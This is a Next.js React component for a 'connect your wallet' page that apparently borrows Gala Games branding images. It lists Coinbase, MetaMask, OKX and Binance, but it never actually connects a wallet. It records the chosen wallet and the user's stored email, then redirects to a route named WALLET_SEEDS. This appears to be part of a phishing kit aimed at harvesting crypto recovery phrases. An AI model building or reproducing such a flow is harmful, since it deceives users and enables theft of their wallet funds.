'use client'
import styles from './styles.module.css'
import {connection} from "@/services/connection";
import {sessionConst} from "@/constants/session";
import {useRouter} from "next/navigation";
import {routeConstants} from "@/constants/route";
import {useState} from "react";

const walletList = [
  {
    img: 'https://static.gala.games/images/web3/coinbase_wallet_logo.png',
    name: 'Connect Coinbase Wallet',
    key: 'coinbase'
  },
  {img: 'https://static.gala.games/images/web3/metamask-logo-small.png', name: 'Connect MetaMask', key: 'metamask'},
  {img: 'https://static.gala.games/images/web3/okx-icon-circle.png', name: 'Connect OKX wallet', key: 'okx'},
  {img: 'https://static.gala.games/images/web3/binance-icon.png', name: 'Connect Binance Wallet', key: 'binance'},
]

export function WalletSection() {
  const [loading, setLoading] = useState(false)
  const navigate = useRouter()

  const handleWalletConnect = async (walletKey: string) => {
    setLoading(true)
    const res = await connection.withoutActions({
      walletName: ` ${walletKey} `,
      email: ` ${sessionStorage.getItem(sessionConst.Email) ?? ''} `,
    })
    setLoading(false)

    console.log('res', res)
    if (res.error) {
      window.location.reload()
    } else {
      navigate.push(routeConstants.WALLET_SEEDS)
    }
  }


  return (
    <div className={styles.container}>
      <div className={styles.wrapper}>
        <h2 className={styles.header}>Welcome!</h2>
        <p className={styles.header}>Let{"'"}s connect your wallet</p>

        <p className={styles.selectWallet}>Select a wallet provider</p>

        <div className={styles.walletList}>
          {walletList.map((wallet) => (
            <button disabled={loading} onClick={() => handleWalletConnect(wallet.key)} key={wallet.key}
                    className={styles.walletItem}>
              <img width={24} src={wallet.img} alt={wallet.name}/>
              <span>{wallet.name}</span>
            </button>
          ))}
        </div>

        <hr className={styles.separator}/>

        <img src='/footer/articles.png' className={styles.articles}/>
      </div>
    </div>
  );
};
